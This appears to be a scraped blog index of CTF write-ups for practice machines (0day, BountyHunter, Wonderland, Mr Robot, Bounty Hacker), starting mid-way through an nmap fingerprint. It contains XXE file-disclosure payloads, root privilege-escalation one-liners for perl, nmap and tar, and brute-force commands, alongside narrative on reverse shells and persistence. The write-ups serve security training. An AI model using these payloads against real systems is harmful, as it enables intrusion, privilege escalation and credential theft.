fingerprint:OS:SCAN(V=7.92%E=4%D=2/23%OT=22%CT=1%CU=37924%PV=Y%DS=5%DC=T%G=Y%TM=62163EBOS:D%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPSOS:(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST1OS:1NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECNOS:(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(ROS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%FOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CDOS:=S)Network Distance: 5 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_smb2-time: Protocol negotiation failed (SMB2)TRACEROUTE (using port 80/tcp)HOP RTT ADDRESS1 10.57 ms 10.17.0.12 ... 45 158.61 ms 10.10.58.61OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Wed Feb 23 09:03:41 2022 -- 1 IP address (1 host up) scanned in 330.26 secondsFound /management directory while directory busting on port 445 http server. (Also, found some rabbit holes as well.)Looks like its running some traffic management system.Simple search using searchsploit revealed a couple of exploits.Exploitation -50244.py which is written in python2 is worked for me without any fixing. (Tho it did give some exception but it managed to upload web shell so we can use that to get rev shell.)Post Exploitation -Ran linpeas and it revealed something interesting…On manual enumeration found mysql creds…Found some username and hashes inside db entry.And using crackstation, I got the password for puser.I remember seeing plot_admin user in the machine. Let’s try creds for that user…Okay, fuck it! Remember the linpeas output. Let’s enumerate on that. Thank goodness deployed machine started acting funny otherwise I’d have stuck in this rabbit hole much longer.Since, our user own this folder. We can simply delete backup.sh and replace it with our reverse shell. Start listener and cron will do its job.PrivEsc to root -Ran linpeas again coz last time my rev shell crashed while running it.Looks like we can run openssl as root… Interesting…So basically doas is just like sudo.We can just read the root flag but that won’t be fun right? Ehehe~Gonna put authorized_keys inside /root/.ssh/authorized_keys file so we can get ssh connection easily.Phew… Let’s try to ssh and we should get root shell. (Hopefully…)" }, { "title": "0day -- Writeup", "url": "/posts/0day/", "categories": "TryHackMe, Medium", "tags": "tryhackme, ctf, nikto, shellshock, cve-2015-8660, overlayfs", "date": "2022-02-06 00:00:00 +0900", "snippet": "Summary -Pretty fun room which involves a pretty famous vulnerability named as Shellshock. And once we get initial access to machine we can enumerate and get root privileges via overlayfs privilege escalation exploit.Enumeration -Nmap, here we go…nmap scan -# Nmap 7.92 scan initiated Mon Jan 31 09:40:27 2022 as: nmap -T4 -p- -A -oA port_scan 10.10.152.254 Nmap scan report for 10.10.152.254 Host is up (0.16s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA) | 2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA) | 256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA) |_ 256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-title: 0day |_http-server-header: Apache/2.4.7 (Ubuntu) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=1/31%OT=22%CT=1%CU=30604%PV=Y%DS=5%DC=T%G=Y%TM=61F7F75 OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)SEQ OS:(SP=100%GCD=1%ISR=10D%TI=Z%CI=I%TS=8)OPS(O1=M506ST11NW6%O2=M506ST11NW6%O OS:3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST11NW6%O6=M506ST11)WIN(W1=68DF%W2= OS:68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSN OS:W6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 5 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 3306/tcp) HOP RTT ADDRESS 1 13.80 ms 10.17.0.1 2 ... 4 5 152.29 ms 10.10.152.254 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Jan 31 09:50:56 2022 -- 1 IP address (1 host up) scanned in 628.71 secondsLooks like 22 ssh and 80 http ports are open. Tried dirbusting and some manual enumeration but no luck on finding any interesting… Nikto showed something interesting tho…Looks like it is vulnerable to shellshock. Let’s research.https://www.exploit-db.com/docs/48112Exploitation -Let’s start http server on port 80 and then we’ll use curl or wget payload to make connection to confirm rce is working or not.Request from server is made…Let’s put a reverse shell…So, we got a shell as www-data user.Post Exploitation -Let’s put linpeas and run.linpeas showed we are running pretty old kernel. And a couple of kernel exploits are availabe. overlayfs one worked for me.We are getting error on compliling…. Looks like machine’s path is messed up. Let’s see on Google what it is and fix it and then compile and run the exploit.And now worked… Yay, we are root!" }, { "title": "BountyHunter -- Writeup", "url": "/posts/BountyHunter/", "categories": "HackTheBox, Easy", "tags": "hackthebox, ctf, xxe", "date": "2021-12-01 00:00:00 +0900", "snippet": "Summary -Easy rated Hackthebox machine. To get initial access, have to do XXE with the help of other information. Also, privilege escalation is pretty tricky as well… Have to create a certain .md file in a certain way to abuse it. Overall a fun machine…Enumeration -nmap, here we go…nmap -# Nmap 7.91 scan initiated Sun Jul 25 05:59:02 2021 as: nmap -T4 -A -p22,80 -oA nmap 10.10.11.100Nmap scan report for 10.10.11.100Host is up (0.081s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)| 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)|_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Bounty HuntersWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTE (using port 443/tcp)HOP RTT ADDRESS1 106.81 ms 10.10.14.12 106.89 ms 10.10.11.100OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sun Jul 25 05:59:16 2021 -- 1 IP address (1 host up) scanned in 14.23 secondsTwo ports are open. 22 ssh and 80 http server.port 80 -Contains some portal which says its in development.Looks like its using XML as backend. Let’s intercept using Burp and see.Explotation -So, its sending data with base64 encoding which if we decode then we can see data parsing using XML format. That means we can try XXE here. Yay!# Default&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt; &amp;lt;bugreport&amp;gt; &amp;lt;title&amp;gt;apache&amp;lt;/title&amp;gt; &amp;lt;cwe&amp;gt;ads&amp;lt;/cwe&amp;gt; &amp;lt;cvss&amp;gt;asd&amp;lt;/cvss&amp;gt; &amp;lt;reward&amp;gt;asd&amp;lt;/reward&amp;gt; &amp;lt;/bugreport&amp;gt;# XXE for file disclosure&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;&amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&amp;gt; ]&amp;gt; &amp;lt;bugreport&amp;gt; &amp;lt;title&amp;gt;&amp;amp;xxe;&amp;lt;/title&amp;gt; &amp;lt;cwe&amp;gt;ads&amp;lt;/cwe&amp;gt; &amp;lt;cvss&amp;gt;asd&amp;lt;/cvss&amp;gt; &amp;lt;reward&amp;gt;asd&amp;lt;/reward&amp;gt; &amp;lt;/bugreport&amp;gt;# XXE with php filter.&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;&amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=db.php&quot;&amp;gt; ]&amp;gt; &amp;lt;bugreport&amp;gt; &amp;lt;title&amp;gt;&amp;amp;xxe;&amp;lt;/title&amp;gt; &amp;lt;cwe&amp;gt;ads&amp;lt;/cwe&amp;gt; &amp;lt;cvss&amp;gt;asd&amp;lt;/cvss&amp;gt; &amp;lt;reward&amp;gt;asd&amp;lt;/reward&amp;gt; &amp;lt;/bugreport&amp;gt;Okay, so XXE worked. (Make sure to put base64 encoded payload.) With /etc/passwd file disclosure payload.Hmm… I tried to grab ssh keys but no luck. But fluff showed one interesting file which is db.php maybe we can grab it through XXE and then maybe we can see something.So… With the help of XXE php wrapper I managed to get that file which showed some creds.From /etc/passwd disclosure, there are two users in home directory which are development and sysylog but creds worked for development user. (Read /etc/passwd to confirm this.)development:&amp;lt;redacted&amp;gt; #ssh credsLet’s try to ssh to developement with above creds and it should work.Post Exploitation -Let’s login as development user.sudo -l revealed interesting file we can execute as root without password…According to the condition its taking we need to create a manually .md file with certain conditions to abuse it.Run ticketValidator.py as sudo and give path of your .md file and you should get root." }, { "title": "Wonderland -- Writeup", "url": "/posts/Wonderland/", "categories": "TryHackMe, Medium", "tags": "tryhackme, ctf, wordpress, bruteforce, suid", "date": "2021-06-05 00:00:00 +0900", "snippet": "Summary -“Fall down the rabbit hole and enter wonderland.” As the room descriptions says, pretty fun machine just don’t get caught in rabbit holes.Enumeration -Lets run quick nmap scan.sudo nmap -A &amp;lt;ip&amp;gt;This returned 2 open ports. port service 22 SSH 80 Web server Let’s enumerate port 80.Nothing much on home page except some picture and words. Picture is from /img so let’s check it and download them to check for steganography.Using steghide on white_rabbit_1.jpg with no pass extracts hint.txt file which says follow the r a b b i t.Interesting….Let’s directory burst cause no idea what this hint means.dirsearch -u http://10.10.163.161/ -e php,txt,html -x 400,401,403 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -rThis returns 3 interesting directories which are /r/ , /poem/, and /img/. Already checked /img/ so let’s check this two./poem contains a nice poem. Give it a read!/r contains some message.I used -r so its gonna directory burst every directory it find with all dictionary words but I’m gonna stop it after 10% done cause that’s enough.No interesting directory after /poem/ but on /r/ we found another directory which is /r/a/. It contains some conversation type message. Again after some time I stop the scan and tell dirsearch to start on /r/a/.Now, dirsearch founds /r/a/b/…Interesting huh? Remember the hint. Go on like this or you already know from the hint now. I dirsearch all the way till end after then I noticed r a b b i t hint actually suggests to go to the /r/a/b/b/i/t/ directory.Now, in the directory check the page source where some creds are hidden.Exploitation -Use Alice’s creds to ssh to the machine.Post Exploitation -Woah… We are alice user now. But still a long road remains….sudo -lAbove command reveals /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py can be run as rabbit user.Let’s read walrus_and_the_carpenter.py . We don’t have write privilege but inside this file is an import statement which imports random.Hmmm… So, to exploit it we can create a random.py which will contain python reverse shell and we’ll place this in the same folder as walrus_and_the_carpenter.py file so when it imports it calls random from our random.py file which will generate reverse shell. Start the listener and do this.sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.pyPhew… We got rabbit user but its not over yet. In rabbit user’s home directory contains a root suid. We don’t know what it does so let’s grab it to our machine and analyse it using Ghidra. Copy it using python http server or using scp however you want.After analysing it in Ghidra, head to main function to see c code.In there, the program is setting suid and sgid and then printing some statement and getting some input and then stops.Found the way to exploit it? Congrats! If not allow me to explain.In the program you can see its using system() to do system commands. For first command its using full path but for second which is date is not. So, yes we can modify our path and point it to the date executable we gonna create.Create date file which will contain reverse shell. Make sure to give it shebang so it’ll know where this belongs. Start listener and get shell.Congrats!!! You are now hatter user. Use the creds and then ssh directly as hatter to get stable access.If you ran linpeas before you may notice we can now get direct root from here. If not then go ahead and run linpeas which will highlight 2 capabilities having set as setuid. Why I didn’t say this before? Cause ofcourse, only hatter can execute them.Grab the capability exploit for perl from gtfobins and use it to get root.perl -e &#39;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;&#39;Congrats, root is owned now." }, { "title": "Mr Robot -- Writeup", "url": "/posts/Mr-Robot/", "categories": "TryHackMe, Medium", "tags": "tryhackme, ctf, wordpress, bruteforce, suid", "date": "2021-06-05 00:00:00 +0900", "snippet": "Summary -Medium rated machine based on the Mr. Robot show. For initial access we have to do some bruteforcing and abuse wordpress vulnerability and then suid abuse to get root.Enumeration -Lets run quick nmap scan.sudo nmap -A &amp;lt;ip&amp;gt;This returned 2 open ports. port service 22 SSH 80 Web server 443 Web server (HTTPS) Let’s enumerate port 80.Hmm… Interesting page.Let’s check /robots.txt.So, we found the first key. Also, we got some wordlist.Lets directory burst.dirsearch -u url -e php,txt,html -x 400,401,403 -w wordlistFound /wp-admin/ page which redirects to login.Exploitation -We can try to bruteforce username/password using that but since this is Mr Robot box let’s guess the username and try Elliot.Bingo! Wordpress says wrong password for username Elliot. Let’s bruteforce password using the wordlist we got above but before that I noticed this contains so many words and duplicates. Let’s sort it out using below commmand.sort fsocity.dlc | uniq &amp;gt; fsocity-sorted.dlcNow, lets bruteforce with sorted wordlist.wpscan --url http://ip/ -U Elliot -P fsocity-sorted.dlcAnd we found the password. Let’s get shell by uploading php shell as theme. If you don’t what this is do wordpress theme exploit reverse shell search on Google.And we got daemon user.Post Exploitation -Run linpeas and you’ll see nmap is running as suid.Let’s exploit it to get root./usr/local/bin/nmap --interactive!sh" }, { "title": "Bounty Hacker -- Writeup", "url": "/posts/Bounty-Hacker/", "categories": "TryHackMe, Easy", "tags": "tryhackme, ctf, hydra, bruteforce", "date": "2020-08-08 00:00:00 +0900", "snippet": "Summary -Pretty simple and straight forward room consisting of basic enumeration.Enumeration -Lets run quick nmap scan.sudo nmap &amp;lt;ip&amp;gt;This returned 3 open ports. port service 21 FTP 22 SSH 80 Web server Let’s enumerate ftp port first.Connect to it. Type,ftp &amp;lt;ip&amp;gt;Login using anonymous name.Now, let’s view files using ls command.There are two files named as locks.txt and task.txt.Get them to your pc and see whats inside.First one has a username and other has list of words which is a password list for bruteforcing.Exploitation -Since we have username and password list, let’s do a bruteforcing attack using Hydra.Hydra is a tool we are going to use to do bruteforcing.Type:-hydra -l &amp;lt;username&amp;gt; -P &amp;lt;password_list&amp;gt; -t 1 &amp;lt;ip&amp;gt; sshNow, we know the password.Let’s login over ssh.Type:-ssh &amp;lt;username&amp;gt;@&amp;lt;ip&amp;gt;And enter the password you got.Post Exploitation -Type sudo -l and see that we can run tar app as a root.Let’s go to gtfobins and get the sudo exploit for tar.If you can’t find it, here type:-sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/shOnce you execute above command, you’ll become a root user.Congrats, now get the flags." } ]
